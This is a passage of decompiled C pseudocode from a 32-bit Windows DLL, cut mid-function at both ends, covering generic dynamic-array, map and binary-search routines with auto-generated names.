  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013429A);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_WORD *)(this[3] + 2 * v2) = *(_WORD *)(this[3] + 2 * v2 + 2);
    ++v2;
  }
  *(_WORD *)(this[3] + 2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1003A2CA) --------------------------------------------------------
int __thiscall sub_1003A2CA(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013429B);
  return this[3] + 2 * a2;
}

//----- (1003A2E8) --------------------------------------------------------
int __thiscall sub_1003A2E8(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101342D6);
  return this[3] + 2 * a2;
}

//----- (1003A306) --------------------------------------------------------
int __thiscall sub_1003A306(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_WORD *)(this[3] + 2 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1003A346) --------------------------------------------------------
unsigned int __thiscall sub_1003A346(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101342D7);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 2 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 2 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1003A3B8) --------------------------------------------------------
unsigned int __thiscall sub_1003A3B8(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(2 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_WORD *)(this[3] + 2 * v6) = *(_WORD *)(a3 + 2 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (1003A417) --------------------------------------------------------
void __thiscall sub_1003A417(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _WORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _WORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(2 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_WORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j_j__free(Block);
    this[2] = v11;
  }
}

//----- (1003A4CE) --------------------------------------------------------
void __thiscall sub_1003A4CE(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &off_10103BA0;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j_j__free(v2 - 1);
  }
  this[3] = 0;
  sub_10039F05(this);
}
// 10103BA0: using guessed type int (__thiscall *off_10103BA0)(void *Block, char);

//----- (1003A531) --------------------------------------------------------
void __thiscall sub_1003A531(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  _DWORD *v3; // edi
  int v4; // esi
  int v5; // eax
  unsigned int v6; // eax
  int v7; // ebx
  LONG v8[5]; // [esp+10h] [ebp-24h] BYREF
  _DWORD *v9; // [esp+24h] [ebp-10h]
  int v10; // [esp+30h] [ebp-4h]
  int v11; // [esp+3Ch] [ebp+8h]

  v3 = this;
  v9 = this;
  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*v3 + 76))(v3, a3, &unk_10134376);
  sub_1000B36F(a2, (int)v8);
  v10 = 0;
  v4 = *v3;
  v5 = (*(int (__thiscall **)(_DWORD *))(*v3 + 4))(v3);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(v3, v5 + 1);
  v6 = (*(int (__thiscall **)(_DWORD *))(*v3 + 4))(v3);
  if ( v6 > a3 )
  {
    v7 = 20 * v6;
    v11 = v6 - a3;
    do
    {
      sub_1000B3BD((LONG *)(v3[3] + v7 - 20), v3[3] + v7);
      v3 = v9;
      v7 -= 20;
      --v11;
    }
    while ( v11 );
  }
  sub_1000B3BD(v8, v3[3] + 20 * a3);
  ++v9[1];
  v10 = -1;
  sub_1000B3DF(v8);
}
// 1003A531: using guessed type LONG var_24[5];

//----- (1003A5D3) --------------------------------------------------------
int __thiscall sub_1003A5D3(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  int v4; // ebp
  int v5; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10134377);
  v3 = *this;
  --this[1];
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v4 = 20 * a2;
    do
    {
      sub_1000B3BD((LONG *)(this[3] + v4 + 20), this[3] + v4);
      ++a2;
      v4 += 20;
    }
    while ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1000B3BD(dword_10193BE0, this[3] + 20 * v5);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193BE0: using guessed type LONG dword_10193BE0[6];

//----- (1003A648) --------------------------------------------------------
int __thiscall sub_1003A648(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101343EE);
  return this[3] + 20 * a2;
}

//----- (1003A667) --------------------------------------------------------
int __thiscall sub_1003A667(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101343EF);
  return this[3] + 20 * a2;
}

//----- (1003A686) --------------------------------------------------------
int __thiscall sub_1003A686(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebp
  int v4; // ebp
  int v5; // eax
  unsigned int v7; // [esp+8h] [ebp-4h]

  v2 = a2;
  v7 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 20 * a2;
    do
    {
      sub_1000B3BD(dword_10193BE0, v4 + this[3]);
      ++v7;
      v4 += 20;
    }
    while ( v7 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    v2 = a2;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v5 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}
// 10193BE0: using guessed type LONG dword_10193BE0[6];

//----- (1003A6E2) --------------------------------------------------------
unsigned int __thiscall sub_1003A6E2(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10134496);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 20;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1003A75E) --------------------------------------------------------
unsigned int __thiscall sub_1003A75E(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // esi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // edi
  int v10; // eax
  unsigned int result; // eax
  unsigned int v12; // [esp+24h] [ebp+8h]
  int v13; // [esp+2Ch] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (20 * (unsigned __int64)(unsigned int)v5) >> 32 != 0 ? -1 : 20 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 0x14u, v5, sub_1003ACB2, (void (__thiscall *)(void *))sub_1000B3DF);
  }
  v12 = 0;
  this[1] = a2;
  v10 = *this;
  this[3] = v8;
  result = (*(int (__thiscall **)(_DWORD *))(v10 + 4))(this);
  if ( result )
  {
    v13 = 0;
    do
    {
      sub_1000B3BD((LONG *)(v13 + a3), v13 + this[3]);
      ++v12;
      v13 += 20;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v12 < result );
  }
  return result;
}

//----- (1003A80F) --------------------------------------------------------
void __thiscall sub_1003A80F(_DWORD *this)
{
  int v2; // esi
  int v3; // eax
  int v4; // esi
  int v5; // eax
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // esi
  int v9; // esi
  char *i; // eax
  char *v11; // [esp+14h] [ebp-1Ch]
  int v12; // [esp+18h] [ebp-18h]
  unsigned int v13; // [esp+1Ch] [ebp-14h]
  int v14; // [esp+20h] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v14 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v14 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v11 = (char *)this[3];
    v6 = (20 * (unsigned __int64)(unsigned int)v14) >> 32 != 0 ? -1 : 20 * v14;
    v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
    if ( v7 )
    {
      v8 = v7 + 1;
      *v7 = v14;
      `eh vector constructor iterator'(v7 + 1, 0x14u, v14, sub_1003ACB2, (void (__thiscall *)(void *))sub_1000B3DF);
      v12 = (int)v8;
    }
    else
    {
      v12 = 0;
    }
    v13 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v9 = v12;
      for ( i = &v11[-v12]; ; i = &v11[-v12] )
      {
        sub_1000B3BD((LONG *)&i[v9], v9);
        ++v13;
        v9 += 20;
        if ( v13 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v12;
    if ( v11 )
    {
      if ( *((_DWORD *)v11 - 1) )
        (**(void (__thiscall ***)(char *, int))v11)(v11, 3);
      else
        j_j__free(v11 - 4);
    }
    this[2] = v14;
  }
}

//----- (1003A928) --------------------------------------------------------
void __thiscall sub_1003A928(_DWORD *this)
{
  *this = &off_10103B00;
  sub_1003A4CE(this + 5);
  sub_1003A1C7((int)(this + 1));
  sub_10039F05(this);
}
// 10103B00: using guessed type int (__thiscall *off_10103B00)(void *Block, char);

//----- (1003A96B) --------------------------------------------------------
bool __thiscall sub_1003A96B(_DWORD *this, _WORD *a2)
{
  int v3; // edi

  v3 = sub_1003ADE6(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_WORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (1003A9A4) --------------------------------------------------------
char __thiscall sub_1003A9A4(_DWORD *this, _WORD *a2)
{
  int v3; // edi

  v3 = sub_1003ADE6(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_WORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1003A9F3) --------------------------------------------------------
int __thiscall sub_1003A9F3(_DWORD *this, _WORD *a2)
{
  int v3; // edi
  int v4; // eax
  int v6[7]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  v3 = sub_1003ADE6(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_WORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    (*(void (__thiscall **)(_DWORD *, _WORD *, int))(this[1] + 32))(this + 1, a2, v3);
    v4 = sub_1000B1F3(0, (int)v6, 0);
    v7 = 0;
    (*(void (__thiscall **)(_DWORD *, int, int))(this[5] + 32))(this + 5, v4, v3);
    v7 = -1;
    sub_1000B3DF(v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 1003A9F3: using guessed type int var_20[7];

//----- (1003AA6F) --------------------------------------------------------
_DWORD *__stdcall sub_1003AA6F(_DWORD *a1)
{
  *a1 = off_100FBF5C;
  *a1 = &off_10103C0C;
  sub_1003AD43(a1 + 1);
  sub_10018FD5(a1 + 5, 0x10u);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103C0C: using guessed type int (__thiscall *off_10103C0C)(void *Block, char);

//----- (1003AAB7) --------------------------------------------------------
void __thiscall sub_1003AAB7(_DWORD *this)
{
  *this = &off_10103C0C;
  sub_100068A5(this + 5);
  sub_1003A1C7((int)(this + 1));
  sub_10039F05(this);
}
// 10103C0C: using guessed type int (__thiscall *off_10103C0C)(void *Block, char);

//----- (1003AAFA) --------------------------------------------------------
int __thiscall sub_1003AAFA(_DWORD *this, _WORD *a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = sub_1003ADE6(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_WORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    (*(void (__thiscall **)(_DWORD *, _WORD *, int))(this[1] + 32))(this + 1, a2, v3);
    v4 = sub_1000D17D(v6, &word_10176304);
    v7 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v4, v3);
    v7 = -1;
    sub_1000D3AD(v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}

//----- (1003AB72) --------------------------------------------------------
int __thiscall sub_1003AB72(_DWORD *this, _WORD *a2)
{
  _WORD *v3; // esi
  int v4; // edi
  _DWORD *v6; // eax

  v3 = a2;
  v4 = sub_1003ADE6(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_WORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v3 )
  {
    v6 = sub_1000E8EF(&a2);
    sub_100078FE((int)v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (1003ABD1) --------------------------------------------------------
void __thiscall sub_1003ABD1(void *this, int a2, int a3)
{
  int v4; // eax
  int v5; // [esp+10h] [ebp-14h] BYREF
  LONG v6[3]; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  sub_1000D372(&v5, a3);
  v7 = 0;
  v4 = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  sub_10001236(v6, (LONG *)(v4 + 4));
  v7 = -1;
  sub_1000D3AD(&v5);
}
// 1003ABD1: using guessed type LONG var_10[3];

//----- (1003AC18) --------------------------------------------------------
_DWORD *__thiscall sub_1003AC18(_DWORD *this, _DWORD *a2)
{
  sub_1003ACF7(this + 1, a2);
  return a2;
}

//----- (1003AC49) --------------------------------------------------------
_DWORD *__thiscall sub_1003AC49(_DWORD *this, _DWORD *a2)
{
  sub_1000809E(this + 5, a2);
  return a2;
}

//----- (1003AC7A) --------------------------------------------------------
void *__thiscall sub_1003AC7A(void *Block, char a2)
{
  sub_1003A1C7((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003AC96) --------------------------------------------------------
_DWORD *__thiscall sub_1003AC96(_DWORD *Block, char a2)
{
  sub_1003A4CE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003ACB2) --------------------------------------------------------
void __thiscall sub_1003ACB2(void *this)
{
  sub_1000B1F3(0, (int)this, 0);
}

//----- (1003ACBF) --------------------------------------------------------
_DWORD *__thiscall sub_1003ACBF(_DWORD *Block, char a2)
{
  sub_1003A928(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003ACDB) --------------------------------------------------------
_DWORD *__thiscall sub_1003ACDB(_DWORD *Block, char a2)
{
  sub_1003AAB7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003ACF7) --------------------------------------------------------
_DWORD *__userpurge sub_1003ACF7@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  *a2 = off_100FBF5C;
  *a2 = &off_10103B40;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1003A3B8(a2, v2, v4, v5);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103B40: using guessed type int (__thiscall *off_10103B40)(void *Block, char);

//----- (1003AD43) --------------------------------------------------------
_DWORD *__stdcall sub_1003AD43(_DWORD *a1)
{
  unsigned int v1; // eax

  *a1 = off_100FBF5C;
  v1 = 1;
  *a1 = &off_10103B40;
  do
    v1 *= 2;
  while ( v1 < 0x10 );
  a1[1] = 0;
  a1[2] = v1;
  a1[3] = operator new(2 * v1);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103B40: using guessed type int (__thiscall *off_10103B40)(void *Block, char);

//----- (1003AD98) --------------------------------------------------------
_DWORD *__userpurge sub_1003AD98@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  sub_10032FFF(a2);
  *a2 = &off_10103BA0;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1003A75E(a2, v2, v4, v5);
  return a2;
}
// 10103BA0: using guessed type int (__thiscall *off_10103BA0)(void *Block, char);

//----- (1003ADE6) --------------------------------------------------------
int __userpurge sub_1003ADE6@<eax>(_DWORD *a1@<ebx>, _WORD *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_WORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_WORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (1003AE6B) --------------------------------------------------------
int __thiscall sub_1003AE6B(_DWORD *this)
{
  int v2; // edi
  _DWORD *v3; // esi
  int v4; // eax
  int v5; // eax
  _DWORD *v6; // eax
  int v8; // [esp-1Ch] [ebp-B4h] BYREF
  int v9; // [esp-18h] [ebp-B0h] BYREF
  int v10; // [esp-14h] [ebp-ACh]
  int v11; // [esp-10h] [ebp-A8h]
  int v12; // [esp-Ch] [ebp-A4h]
  int *v13; // [esp-8h] [ebp-A0h]
  _DWORD v14[9]; // [esp+10h] [ebp-88h] BYREF
  int v15[5]; // [esp+34h] [ebp-64h] BYREF
  int v16[5]; // [esp+48h] [ebp-50h] BYREF
  int v17[4]; // [esp+5Ch] [ebp-3Ch] BYREF
  int v18[2]; // [esp+6Ch] [ebp-2Ch] BYREF
  int v19[2]; // [esp+74h] [ebp-24h] BYREF
  void *v20; // [esp+7Ch] [ebp-1Ch]
  int v21; // [esp+80h] [ebp-18h]
  unsigned int i; // [esp+84h] [ebp-14h]
  int v23; // [esp+94h] [ebp-4h]

  v21 = (int)this;
  sub_1003BB34(v14);
  v23 = 1;
  v2 = dword_10186C1C;
  v3 = this + 19;
  v4 = v2 + sub_10046B33(dword_10186C10, v3, dword_10186E44, dword_10186E48);
  if ( v4 == -1 )
  {
    v23 = -1;
    sub_10038932(v14);
    return 2;
  }
  else
  {
    v5 = sub_1004624E(v3, v4);
    sub_1004664E(v3, v17, v5);
    LOBYTE(v23) = 2;
    for ( i = 0; i < v17[3]; ++i )
    {
      v6 = (_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v17[0] + 44))(v17, i);
      sub_1000B36F(v6, (int)v15);
      LOBYTE(v23) = 3;
      v20 = &v9;
      sub_1000B36F(v15, (int)&v9);
      LOBYTE(v23) = 3;
      sub_10046974((int)v3, v18, v9, v10, v11, v12, (int)v13);
      sub_10046723(v3, v16, v18[0], v18[1]);
      LOBYTE(v23) = 5;
      sub_1000D2FA(v19, 0);
      LOBYTE(v23) = 6;
      if ( sub_1003B15A((int)v19, (int)v14) )
      {
        v13 = v19;
        v20 = &v8;
        sub_1000B36F(v16, (int)&v8);
        LOBYTE(v23) = 6;
        if ( !sub_1003B97E(v8, v9, v10, v11, v12, (int)v13) || sub_1003B15A((int)v19, (int)v14) )
        {
          LOBYTE(v23) = 5;
          sub_1000D3AD(v19);
          LOBYTE(v23) = 3;
          sub_1000B3DF(v16);
          LOBYTE(v23) = 2;
          sub_1000B3DF(v15);
          LOBYTE(v23) = 1;
          sub_10032EA8(v17);
          v23 = -1;
          sub_10038932(v14);
          return 302;
        }
      }
      sub_1003B5BB((int)v14, v21);
      LOBYTE(v23) = 5;
      sub_1000D3AD(v19);
      LOBYTE(v23) = 3;
      sub_1000B3DF(v16);
      LOBYTE(v23) = 2;
      sub_1000B3DF(v15);
    }
    LOBYTE(v23) = 1;
    sub_10032EA8(v17);
    v23 = -1;
    sub_10038932(v14);
    return 0;
  }
}
// 10186C10: using guessed type _DWORD dword_10186C10[3];
// 10186C1C: using guessed type int dword_10186C1C;
// 10186E44: using guessed type int dword_10186E44;
// 10186E48: using guessed type int dword_10186E48;
// 1003AE6B: using guessed type _DWORD var_88[9];
// 1003AE6B: using guessed type int var_64[5];
// 1003AE6B: using guessed type int var_50[5];

//----- (1003B05D) --------------------------------------------------------
Concurrency::details::UMSFreeThreadProxyFactory *__stdcall sub_1003B05D(
        Concurrency::details::UMSFreeThreadProxyFactory *a1,
        int a2,
        __int16 a3)
{
  volatile LONG *v3; // ecx
  volatile LONG *v4; // ecx
  volatile LONG *v6; // [esp+0h] [ebp-28h] BYREF
  volatile LONG *v7; // [esp+4h] [ebp-24h]
  void *v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v8 = &v6;
  sub_1000D372(&v6, a2);
  v9 = -1;
  sub_1004AF1C((int)a1, a3, (int)v6, (int)v7);
  v9 = 1;
  v7 = v3;
  v6 = v3;
  *(_DWORD *)a1 = &off_10103C88;
  sub_1000D372(&v6, a2);
  LOBYTE(v9) = 1;
  sub_1001187B((int)a1 + 56, (int)v6, (int)v7);
  LOBYTE(v9) = 3;
  v7 = v4;
  v6 = v4;
  sub_10039112(&v6, 0);
  LOBYTE(v9) = 3;
  sub_100454FE((char *)a1 + 56, (int)a1 + 76, 0, (int)v6, v7);
  return a1;
}
// 1003B094: variable 'v3' is possibly undefined
// 1003B0BF: variable 'v4' is possibly undefined
// 10103C88: using guessed type int (__thiscall *off_10103C88)(void *Block, char);

//----- (1003B0EE) --------------------------------------------------------
_DWORD *__thiscall sub_1003B0EE(_DWORD *Block, char a2)
{
  sub_1003B10A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003B10A) --------------------------------------------------------
void __thiscall sub_1003B10A(_DWORD *this)
{
  _BYTE *v2; // edi

  *this = &off_10103C88;
  v2 = this + 14;
  (*(void (__thiscall **)(_DWORD *))(this[14] + 32))(this + 14);
  sub_10036C70((int)(this + 19));
  sub_100119B4(v2);
  Concurrency::details::UMSFreeThreadProxyFactory::~UMSFreeThreadProxyFactory((Concurrency::details::UMSFreeThreadProxyFactory *)this);
}
// 10103C88: using guessed type int (__thiscall *off_10103C88)(void *Block, char);

//----- (1003B15A) --------------------------------------------------------
int __stdcall sub_1003B15A(int a1, int a2)
{
  int v2; // esi
  int v3; // eax
  LONG *v4; // eax
  LONG *v5; // eax
  _DWORD *i; // esi
  int v7; // ecx
  int v8; // edi
  int v9; // eax
  int v11; // [esp-8h] [ebp-8Ch] BYREF
  int v12; // [esp-4h] [ebp-88h]
  int v13[2]; // [esp+14h] [ebp-70h] BYREF
  void *v14[2]; // [esp+1Ch] [ebp-68h] BYREF
  int v15; // [esp+24h] [ebp-60h] BYREF
  LONG v16; // [esp+28h] [ebp-5Ch] BYREF
  int v17[2]; // [esp+2Ch] [ebp-58h] BYREF
  _DWORD v18[2]; // [esp+34h] [ebp-50h] BYREF
  int v19; // [esp+3Ch] [ebp-48h] BYREF
  int v20; // [esp+44h] [ebp-40h] BYREF
  int v21; // [esp+4Ch] [ebp-38h] BYREF
  int v22; // [esp+54h] [ebp-30h] BYREF
  int v23; // [esp+5Ch] [ebp-28h] BYREF
  int v24; // [esp+64h] [ebp-20h] BYREF
  int v25[3]; // [esp+6Ch] [ebp-18h] BYREF
  int v26; // [esp+80h] [ebp-4h]

  v2 = sub_1000DF75(a1, (int)&unk_10186C08, 0);
  v3 = sub_1000DF75(a1, (int)&unk_10186BF8, 0);
  if ( v2 == -1 || v3 == -1 )
    return 2;
  sub_1000D836(v3 + *(_DWORD *)(dword_10186BFC + 28) - v2, a1, &v15, v2);
  v26 = 0;
  sub_1000D17D(v13, &word_10175EE4);
  LOBYTE(v26) = 1;
  sub_1000D17D(v14, asc_10175EE8);
  LOBYTE(v26) = 2;
  v4 = sub_1000D9E4((int)v13, v14, &v15, 0);
  sub_10001236(v4 + 1, &v16);
  LOBYTE(v26) = 1;
  sub_1000D3AD((int *)v14);
  LOBYTE(v26) = 0;
  sub_1000D3AD(v13);
  sub_1000D17D(v13, &word_10175EEC);
  LOBYTE(v26) = 3;
  sub_1000D17D(v14, asc_10175EF0);
  LOBYTE(v26) = 4;
  v5 = sub_1000D9E4((int)v13, v14, &v15, 0);
  sub_10001236(v5 + 1, &v16);
  LOBYTE(v26) = 3;
